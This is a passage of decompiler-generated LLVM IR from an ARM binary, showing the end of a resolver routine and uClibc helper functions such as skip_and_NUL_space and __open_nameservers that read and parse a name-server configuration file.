bb232:                                            ; preds = %dec_label_pc_165dc
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16684

dec_label_pc_165f0:                               ; preds = %dec_label_pc_165dc
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.062, i32* @r5, align 4
  %v1_165f8 = add i32 %v0_165b4, 16
  %v2_165f8 = inttoptr i32 %v1_165f8 to i32*
  %v3_165f8 = load i32, i32* %v2_165f8, align 4
  %v2_165fc = sub i32 %tmp163, %stack_var_-452.062
  %v1_16600 = add i32 %v2_165fc, -1
  store i32 %v1_16600, i32* %r3.global-to-local, align 4
  %v1_16604 = add i32 %v3_165f8, 4
  store i32 %v1_16604, i32* %r2.global-to-local, align 4
  %v2_16608 = mul i32 %v1_16604, %v1_16600
  store i32 %v2_16608, i32* @r1, align 4
  %v1_1660c = add i32 %v0_165b4, 32
  %v2_1660c = inttoptr i32 %v1_1660c to i32*
  %v3_1660c = load i32, i32* %v2_1660c, align 4
  store i32 %v3_1660c, i32* %r2.global-to-local, align 4
  %v3_16610 = icmp uge i32 %v2_16608, %v3_1660c
  store i1 %v3_16610, i1* %cpsr_c.global-to-local, align 1
  %v2_16614 = add i32 %v0_165b4, 36
  %v3_16614 = inttoptr i32 %v2_16614 to i32*
  store i32 %v1_16600, i32* %v3_16614, align 4
  %tmp289 = icmp ugt i32 %v2_16608, %v3_1660c
  br i1 %tmp289, label %dec_label_pc_166ac, label %dec_label_pc_1661c

dec_label_pc_1661c:                               ; preds = %dec_label_pc_165f0
  store i32 0, i32* @r7, align 4
  %v1_16624 = load i32, i32* @sb, align 4
  %v2_16624 = add i32 %v1_16624, 36
  %v3_16624 = inttoptr i32 %v2_16624 to i32*
  store i32 0, i32* %v3_16624, align 4
  br label %dec_label_pc_16684

dec_label_pc_1662c:                               ; preds = %dec_label_pc_16578
  store i32 %v2_164b8, i32* @r0, align 4
  %v0_16630 = call i32 @free()
  store i32 %v5_1650c, i32* %r3.global-to-local, align 4
  store i32 %v0_15fa0, i32* @ip, align 4
  %v3_1663c = icmp uge i32 %v5_1650c, %v0_15fa0
  store i1 %v3_1663c, i1* %cpsr_c.global-to-local, align 1
  %v9_1663c = icmp eq i32 %v5_1650c, %v0_15fa0
  br i1 %v9_1663c, label %dec_label_pc_16644, label %dec_label_pc_16684

dec_label_pc_16644:                               ; preds = %dec_label_pc_1662c
  %v0_16644 = load i32, i32* @sb, align 4
  %v1_16644 = add i32 %v0_16644, 16
  %v2_16644 = inttoptr i32 %v1_16644 to i32*
  %v3_16644 = load i32, i32* %v2_16644, align 4
  store i32 %v3_16644, i32* %r1.global-to-local, align 4
  store i32 %v5_16504, i32* %r3.global-to-local, align 4
  %v3_1664c = icmp uge i32 %v3_16644, %v5_16504
  store i1 %v3_1664c, i1* %cpsr_c.global-to-local, align 1
  %v9_1664c = icmp eq i32 %v3_16644, %v5_16504
  br i1 %v9_1664c, label %dec_label_pc_16660, label %dec_label_pc_16654

dec_label_pc_16654:                               ; preds = %dec_label_pc_16644
  %v1_16654 = inttoptr i32 %v0_16644 to i32*
  %v2_16654 = load i32, i32* %v1_16654, align 4
  store i32 %v2_16654, i32* @r0, align 4
  %v0_16658 = call i32 @free()
  br label %dec_label_pc_166d4

dec_label_pc_16660:                               ; preds = %dec_label_pc_16644
  %v1_16660 = add i32 %v0_16644, 36
  %v2_16660 = inttoptr i32 %v1_16660 to i32*
  %v3_16660 = load i32, i32* %v2_16660, align 4
  store i32 %v3_16660, i32* %r2.global-to-local, align 4
  %v1_16664 = add i32 %v0_16644, 28
  %v2_16664 = inttoptr i32 %v1_16664 to i32*
  %v3_16664 = load i32, i32* %v2_16664, align 4
  store i32 %v3_16664, i32* @r3, align 4
  %v3_16668 = mul i32 %v3_16660, %v5_16504
  %v4_16668 = add i32 %v3_16664, %v3_16668
  store i32 %v4_16668, i32* @r0, align 4
  store i32 %v5_16504, i32* @r2, align 4
  store i32 %v1_16524, i32* @r1, align 4
  %v0_16674 = call i32 @memcpy()
  %v0_16678 = load i32, i32* @sb, align 4
  %v1_16678 = add i32 %v0_16678, 36
  %v2_16678 = inttoptr i32 %v1_16678 to i32*
  %v3_16678 = load i32, i32* %v2_16678, align 4
  %v1_1667c = add i32 %v3_16678, 1
  store i32 %v1_1667c, i32* %r3.global-to-local, align 4
  store i32 %v1_1667c, i32* %v2_16678, align 4
  br label %dec_label_pc_16684

dec_label_pc_16684:                               ; preds = %bb232, %dec_label_pc_1662c, %dec_label_pc_1661c, %dec_label_pc_16660
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_16660 ], [ 0, %dec_label_pc_1662c ], [ 0, %dec_label_pc_1661c ], [ 1, %bb232 ]
  %v1_1668c = load i32, i32* @r4, align 4
  %v2_1668c = add i32 %v1_1668c, %stack_var_-460.365
  %v1_16690 = add nuw nsw i32 %stack_var_-452.062, 1
  store i32 %v1_16690, i32* @r1, align 4
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 %v1_16690, i32* %r2.global-to-local, align 4
  %v3_166a4 = icmp uge i32 %v1_16690, %tmp163
  store i1 %v3_166a4, i1* %cpsr_c.global-to-local, align 1
  %v5_166a8 = icmp slt i32 %v1_16690, %tmp163
  br i1 %v5_166a8, label %dec_label_pc_16470, label %dec_label_pc_166ac

dec_label_pc_166ac:                               ; preds = %dec_label_pc_16568, %dec_label_pc_16448, %dec_label_pc_16684, %dec_label_pc_165c0, %dec_label_pc_165f0, %bb231
  %v1_166b0 = call i32 @__GI___libc_close(i32 %v3_16264)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_166b8 = icmp eq i32 %arg3, 0
  br i1 %v2_166b8, label %.thread22, label %bb234

bb234:                                            ; preds = %dec_label_pc_166ac
  %v1_166c0 = load i32, i32* @sl, align 4
  %v3_166bc = inttoptr i32 %arg3 to i32*
  store i32 %v1_166c0, i32* %v3_166bc, align 4
  br label %bb235

.thread22:                                        ; preds = %dec_label_pc_166ac
  br label %bb235

bb235:                                            ; preds = %bb234, %.thread22
  store i32 ptrtoint (i32* @global_var_166c8.504 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_166b8, i32 ptrtoint (i32* @global_var_f0a8.425 to i32))
  store i32 %v1_15fe8, i32* @r0, align 4
  %v0_166cc = call i32 @free()
  br label %dec_label_pc_16744

dec_label_pc_166d4:                               ; preds = %thread-pre-split, %dec_label_pc_162b0, %dec_label_pc_16420, %dec_label_pc_16418, %dec_label_pc_163c8, %dec_label_pc_163d4, %dec_label_pc_163e0thread-pre-split, %thread-pre-split.thread, %dec_label_pc_16390, %dec_label_pc_16568, %dec_label_pc_1655c, %dec_label_pc_16274, %dec_label_pc_16254, %dec_label_pc_16654
  %v1_166d8 = add i32 %v0_16178, 1
  store i32 %v1_166d8, i32* @r5, align 4
  br label %dec_label_pc_166e4

dec_label_pc_166e4:                               ; preds = %.thread8, %dec_label_pc_166d4
  %storemerge23 = phi i32 [ -1, %dec_label_pc_166d4 ], [ %v7_16374, %.thread8 ]
  %stack_var_-468.2 = phi i32 [ %v1_166d8, %dec_label_pc_166d4 ], [ %v0_16178, %.thread8 ]
  store i32 %storemerge23, i32* @r7, align 4
  %v1_166e8 = add i32 %stack_var_-476.1, -1
  store i32 %v1_166e8, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp236 = icmp slt i32 %v1_166e8, 1
  br i1 %tmp236, label %dec_label_pc_16704, label %dec_label_pc_16084

dec_label_pc_166fc:                               ; preds = %dec_label_pc_16228, %bb222, %bb217, %.thread6, %dec_label_pc_16004
  br label %dec_label_pc_16704

dec_label_pc_16704:                               ; preds = %dec_label_pc_166e4, %.thread134, %dec_label_pc_166fc
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_166fc ], [ -1, %.thread134 ], [ %v3_16264, %dec_label_pc_166e4 ]
  %stack_var_-472.1 = phi i32 [ %v1_15fe8, %dec_label_pc_166fc ], [ 0, %.thread134 ], [ %v1_15fe8, %dec_label_pc_166e4 ]
  store i32 55572, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-488.2, i32* @r1, align 4
  %v0_1670c = call i32 @__aeabi_read_tp()
  %v3_16710 = load i32, i32* @global_var_2402c.512, align 4
  store i32 %v3_16710, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_16718 = load i32, i32* @r1, align 4
  %v2_16718 = icmp eq i32 %v0_16718, -1
  store i1 %v2_16718, i1* %cpsr_c.global-to-local, align 1
  %v7_16718 = icmp eq i32 %v0_16718, -1
  %v3_1671c = add i32 %v3_16710, %v0_1670c
  %v4_1671c = inttoptr i32 %v3_1671c to i32*
  store i32 -1, i32* %v4_1671c, align 4
  br i1 %v7_16718, label %dec_label_pc_1672c, label %dec_label_pc_16724

dec_label_pc_16724:                               ; preds = %dec_label_pc_16704, %dec_label_pc_163c0
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_16704 ], [ %v3_16264, %dec_label_pc_163c0 ]
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_16704 ], [ %v1_15fe8, %dec_label_pc_163c0 ]
  %v1_16728 = call i32 @__GI___libc_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_1672c

dec_label_pc_1672c:                               ; preds = %dec_label_pc_16704, %dec_label_pc_16724
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_16704 ], [ %stack_var_-472.2, %dec_label_pc_16724 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_16730 = call i32 @free()
  %v0_16734 = load i32, i32* @sl, align 4
  store i32 %v0_16734, i32* @r0, align 4
  %v0_16738 = call i32 @free()
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16744

dec_label_pc_16744:                               ; preds = %bb235, %dec_label_pc_1672c
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_1672c ], [ %v4_162ec, %bb235 ]
  store i32 %v3_15f8c, i32* @r4, align 4
  store i32 %v6_15f8c, i32* @r5, align 4
  store i32 %v9_15f8c, i32* @r6, align 4
  store i32 %v12_15f8c, i32* @r7, align 4
  store i32 %v15_15f8c, i32* @r8, align 4
  store i32 %v18_15f8c, i32* @sb, align 4
  store i32 %v21_15f8c, i32* @sl, align 4
  store i32 %v24_15f8c, i32* @fp, align 4
  store i32 %v27_15f8c, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_166e8, { 1, 2, 0 }
  uselistorder i32 %v1_16690, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_16644, { 2, 1, 0, 3 }
  uselistorder i32 %v1_16600, { 1, 0, 2 }
  uselistorder i32 %v0_16584, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1652c, { 1, 0 }
  uselistorder i32 %v5_16504, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_164c4, { 4, 5, 0, 6, 7, 1, 2, 3, 8, 9, 10, 11 }
  uselistorder i32 %v2_164c0, { 1, 0 }
  uselistorder i32 %v2_164a4, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_164a0, { 1, 0 }
  uselistorder i32 %v1_1649c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.062, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.365, { 0, 1, 4, 2, 3 }
  uselistorder i32 %v0_16418, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_163f4, { 1, 0 }
  uselistorder i32 %v3_163e8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_163e8, { 0, 2, 1 }
  uselistorder i32 %v2_163dc, { 0, 2, 1 }
  uselistorder i1 %v7_162fc, { 1, 0 }
  uselistorder i32 %v1_162fc, { 1, 0 }
  uselistorder i32 %v0_162fc, { 1, 0 }
  uselistorder i32 %v4_162ec, { 1, 2, 4, 3, 0, 5, 6, 7 }
  uselistorder i32 %v0_162c0, { 1, 0 }
  uselistorder i32 %v3_16264, { 1, 0, 2, 6, 7, 5, 4, 8, 9, 10, 3 }
  uselistorder i32 %v6_1621c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_161a8, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32 %v3_16190, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 %v1_16184, { 1, 0 }
  uselistorder i32 %v0_16178, { 4, 3, 1, 2, 0 }
  uselistorder i32 %v0_16130, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1609c, { 1, 0, 2 }
  uselistorder i1 %v7_16088, { 1, 0 }
  uselistorder i32 %v1_1608c, { 0, 2, 1 }
  uselistorder i32 %v2_16450, { 1, 0 }
  uselistorder i32 %v1_16350, { 2, 0, 1 }
  uselistorder i32 %v2_161d8, { 1, 0, 2 }
  uselistorder i32 %v2_161b0, { 1, 0 }
  uselistorder i32 %v0_16004, { 1, 0, 2 }
  uselistorder i32 %v1_15fe8, { 5, 0, 2, 4, 3, 6, 7, 1, 8, 9 }
  uselistorder i32 %v3_15fb4, { 6, 1, 3, 2, 4, 5, 0, 7 }
  uselistorder i32 %v0_15fa0, { 9, 8, 7, 6, 5, 4, 10, 0, 1, 3, 2 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp164, { 1, 0, 2 }
  uselistorder i32 %tmp163, { 8, 7, 6, 0, 5, 2, 3, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 17, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 18, 19, 55, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 54, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 30, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 22, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 5, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 0, 23, 24, 25, 26, 27, 55, 28, 29, 30, 31, 32, 33, 34, 35, 36, 1, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32 (i32)* @__GI___libc_close, { 1, 0, 2, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 2, 1 }
  uselistorder i32 1000, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 4, 3, 2, 0 }
  uselistorder i32 17, { 1, 5, 2, 6, 0, 4, 7, 3 }
  uselistorder i32 120, { 0, 2, 3, 12, 4, 5, 6, 13, 10, 11, 7, 8, 1, 9 }
  uselistorder i32 27, { 2, 1, 0 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5 }
  uselistorder i32 14352, { 1, 0, 2, 3 }
  uselistorder i32 512, { 3, 6, 7, 2, 8, 4, 9, 1, 10, 11, 12, 13, 5, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16744, { 1, 0 }
  uselistorder label %dec_label_pc_1672c, { 1, 0 }
  uselistorder label %dec_label_pc_16704, { 2, 0, 1 }
  uselistorder label %dec_label_pc_166fc, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_166e4, { 1, 0 }
  uselistorder label %dec_label_pc_166d4, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb235, { 1, 0 }
  uselistorder label %dec_label_pc_166ac, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_16684, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_165dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1655c, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_16470, { 1, 0 }
  uselistorder label %dec_label_pc_16418, { 1, 0 }
  uselistorder label %dec_label_pc_163e8, { 1, 0 }
  uselistorder label %dec_label_pc_163c0, { 1, 0 }
  uselistorder label %dec_label_pc_162fc, { 1, 0, 2 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %dec_label_pc_16158, { 1, 0 }
  uselistorder label %dec_label_pc_1611c, { 1, 0 }
  uselistorder label %bb220, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16754:
  %v0_16754 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16754, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_16754
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_16754, %bb
  %v7_1678c = phi i32 [ %arg1, %dec_label_pc_16754 ], [ 0, %bb ]
  ret i32 %v7_1678c

; uselistorder directives
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 1784, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_167f4 = load i32, i32* @r4, align 4
  store i32 %v3_167f4, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %ip.global-to-local, align 4
  store i32 1784, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_16804.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_168049 = inttoptr i32 %v0_16804.pre to i8*
  %v2_1680410 = load i8, i8* %v1_168049, align 1
  %v2_1680812 = icmp eq i8 %v2_1680410, 0
  store i1 %v2_1680812, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1680812, label %dec_label_pc_16838, label %dec_label_pc_16814

dec_label_pc_16814:                               ; preds = %entry, %bb8.dec_label_pc_16814_crit_edge
  %v1_16814 = phi i32 [ %v1_16814.pre, %bb8.dec_label_pc_16814_crit_edge ], [ 1784, %entry ]
  %v0_16814 = phi i32 [ %v0_16814.pre, %bb8.dec_label_pc_16814_crit_edge ], [ ptrtoint (i32* @global_var_24010.405 to i32), %entry ]
  %v2_1680416 = phi i8 [ %v2_16804, %bb8.dec_label_pc_16814_crit_edge ], [ %v2_1680410, %entry ]
  %v2_1680c17.in.in = phi i8 [ %v2_16804, %bb8.dec_label_pc_16814_crit_edge ], [ %v2_1680410, %entry ]
  %v1_1680415 = phi i8* [ %v1_16804, %bb8.dec_label_pc_16814_crit_edge ], [ %v1_168049, %entry ]
  %v2_1682c14 = phi i32 [ %v2_16830, %bb8.dec_label_pc_16814_crit_edge ], [ %v0_16804.pre, %entry ]
  %v2_1680c17.in = zext i8 %v2_1680c17.in.in to i32
  %v2_1680c17 = mul nuw nsw i32 %v2_1680c17.in, 2
  %v2_16814 = add i32 %v1_16814, %v0_16814
  %v3_16814 = inttoptr i32 %v2_16814 to i32*
  %v4_16814 = load i32, i32* %v3_16814, align 4
  %v2_16818 = add i32 %v4_16814, %v2_1680c17
  %v3_16818 = inttoptr i32 %v2_16818 to i16*
  %v4_16818 = load i16, i16* %v3_16818, align 2
  %v1_1681c = and i16 %v4_16818, 32
  %v2_1681c = icmp eq i16 %v1_1681c, 0
  store i1 %v2_1681c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1681c, label %dec_label_pc_16838, label %dec_label_pc_16824

dec_label_pc_16824:                               ; preds = %dec_label_pc_16814
  %v7_16824 = icmp eq i8 %v2_1680416, 35
  br i1 %v7_16824, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_16824
  %v8_16828 = icmp eq i8 %v2_1680416, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_16824, %bb
  %storemerge = phi i1 [ %v8_16828, %bb ], [ %v7_16824, %dec_label_pc_16824 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_1682c = load i32, i32* %lr.global-to-local, align 4
  %v1_1682c = trunc i32 %v0_1682c to i8
  store i8 %v1_1682c, i8* %v1_1680415, align 1
  %v0_16830 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1683c.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_16830, label %dec_label_pc_16838, label %bb8

bb8:                                              ; preds = %bb7
  %v2_16830 = add i32 %v1_1683c.pre, 1
  store i32 %v2_16830, i32* %r0.global-to-local, align 4
  %v1_16804 = inttoptr i32 %v2_16830 to i8*
  %v2_16804 = load i8, i8* %v1_16804, align 1
  %v2_16808 = icmp eq i8 %v2_16804, 0
  store i1 %v2_16808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16808, label %dec_label_pc_16838, label %bb8.dec_label_pc_16814_crit_edge

bb8.dec_label_pc_16814_crit_edge:                 ; preds = %bb8
  %v0_16814.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_16814.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16814

dec_label_pc_16838:                               ; preds = %bb8, %dec_label_pc_16814, %bb7, %entry
  %v1_1683c = phi i32 [ %v0_16804.pre, %entry ], [ %v1_1683c.pre, %bb7 ], [ %v2_1682c14, %dec_label_pc_16814 ], [ %v2_16830, %bb8 ]
  %v2_16838 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16838, i32* @r4, align 4
  ret i32 %v1_1683c

; uselistorder directives
  uselistorder i8 %v2_16804, { 2, 1, 0 }
  uselistorder i8* %v1_16804, { 1, 0 }
  uselistorder i32 %v2_16830, { 0, 2, 3, 1 }
  uselistorder i1 %v2_1681c, { 1, 0 }
  uselistorder i8 %v2_1680416, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 2, 0, 3, 1 }
  uselistorder i16 0, { 0, 5, 1, 6, 2, 3, 4 }
  uselistorder i32 1784, { 0, 4, 5, 6, 2, 3, 1, 7 }
  uselistorder label %dec_label_pc_16838, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_16814, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16848 = load i32, i32* @r4, align 4
  store i32 %v3_16848, i32* %stack_var_-36, align 4
  %v12_16848 = load i32, i32* @r7, align 4
  %v15_16848 = load i32, i32* @r8, align 4
  %v18_16848 = load i32, i32* @sb, align 4
  %v21_16848 = load i32, i32* @sl, align 4
  %v27_16848 = load i32, i32* @lr, align 4
  store i32 15444, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r5, align 4
  %v4_16858 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15444) to i32*), align 4
  store i32 %v4_16858, i32* @r4, align 4
  %v2_1685c = icmp eq i32 %v4_16858, 0
  br i1 %v2_1685c, label %dec_label_pc_16868, label %dec_label_pc_16898

dec_label_pc_16868:                               ; preds = %entry
  %v2_1686c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1686c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -33992), i32* %r0.global-to-local, align 4
  %v2_16874 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -33992), i32 %v2_1686c)
  store i32 %v2_16874, i32* %r0.global-to-local, align 4
  %v2_16878 = icmp eq i32 %v2_16874, 0
  %v1_1687c = load i32, i32* @r4, align 4
  %.v1_1687c = select i1 %v2_16878, i32 %tmp38, i32 %v1_1687c
  store i32 14380, i32* %r1.global-to-local, align 4
  store i32 %.v1_1687c, i32* %r2.global-to-local, align 4
  %v0_16888 = load i32, i32* @r5, align 4
  %v2_16888 = add i32 %v0_16888, 14380
  %v3_16888 = inttoptr i32 %v2_16888 to i32*
  %v4_16888 = load i32, i32* %v3_16888, align 4
  store i32 %v4_16888, i32* %r3.global-to-local, align 4
  %v9_1688c = icmp eq i32 %v4_16888, %.v1_1687c
  br i1 %v9_1688c, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_16868
  store i32 %.v1_1687c, i32* %v3_16888, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_16868, %bb
  store i32 92312, i32* @lr, align 4
  %v1_16894 = xor i1 %v9_1688c, true
  call void @__pseudo_cond_branch(i1 %v1_16894, i32 ptrtoint (i32* @global_var_16ca4.909 to i32))
  %v0_1689c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16898

dec_label_pc_16898:                               ; preds = %entry, %bb58
  %v2_168b0 = phi i32 [ ptrtoint (i32* @global_var_24010.405 to i32), %entry ], [ %v0_1689c.pre, %bb58 ]
  store i32 15456, i32* %r3.global-to-local, align 4
  %v2_1689c = add i32 %v2_168b0, 15456
  %v3_1689c = inttoptr i32 %v2_1689c to i32*
  %v4_1689c = load i32, i32* %v3_1689c, align 4
  store i32 %v4_1689c, i32* %r3.global-to-local, align 4
  %v2_168a0 = icmp eq i32 %v4_1689c, 0
  br i1 %v2_168a0, label %dec_label_pc_168a8, label %dec_label_pc_16c3c

dec_label_pc_168a8:                               ; preds = %dec_label_pc_16898
  %v4_168b0 = add i32 %v2_168b0, 1802
  %v5_168b0 = inttoptr i32 %v4_168b0 to i8*
  store i8 5, i8* %v5_168b0, align 1
  store i32 -33992, i32* %r0.global-to-local, align 4
  store i32 1803, i32* %r3.global-to-local, align 4
  store i32 -34020, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_168c4 = load i32, i32* @r5, align 4
  %v4_168c4 = add i32 %v2_168c4, 1803
  %v5_168c4 = inttoptr i32 %v4_168c4 to i8*
  store i8 3, i8* %v5_168c4, align 1
  %v0_168c8 = load i32, i32* @r5, align 4
  %v1_168c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_168c8 = add i32 %v1_168c8, %v0_168c8
  store i32 %v2_168c8, i32* @r0, align 4
  %v1_168cc = load i32, i32* %r1.global-to-local, align 4
  %v2_168cc = add i32 %v1_168cc, %v0_168c8
  store i32 %v2_168cc, i32* @r1, align 4
  %v2_168d0 = call i32 @__GI_fopen(i32 %v2_168c8, i32 %v2_168cc)
  store i32 %v2_168d0, i32* %r0.global-to-local, align 4
  store i32 %v2_168d0, i32* @fp, align 4
  %v2_168d4 = icmp eq i32 %v2_168d0, 0
  br i1 %v2_168d4, label %dec_label_pc_16b60, label %dec_label_pc_16b08

dec_label_pc_168e0:                               ; preds = %dec_label_pc_16b08, %dec_label_pc_16b3c.backedge
  store i32 %v2_16b3c, i32* %r0.global-to-local, align 4
  %v2_168e4 = call i32 @skip_and_NUL_space(i8* %v1_168e4)
  store i32 %v2_168e4, i32* %r0.global-to-local, align 4
  store i32 %v2_168e4, i32* @r4, align 4
  %v0_168ec = call i32 @skip_nospace()
  store i32 %v0_168ec, i32* %r0.global-to-local, align 4
  %v1_168f0 = inttoptr i32 %v0_168ec to i8*
  %v2_168f0 = call i32 @skip_and_NUL_space(i8* %v1_168f0)
  store i32 %v2_16b0c, i32* @r1, align 4
  store i32 %v2_168f0, i32* @r7, align 4
  %v0_168fc = load i32, i32* @r4, align 4
  store i32 %v0_168fc, i32* %r0.global-to-local, align 4
  %v2_16900 = inttoptr i32 %v0_168fc to i8*
  %v3_16900 = call i32 @__GI_strcoll(i8* %v2_16900, i32 %v2_16b0c)
  store i32 %v3_16900, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_16900, 16777216
  %v1_16904 = sdiv i32 %sext, 16777216
  store i32 %v1_16904, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
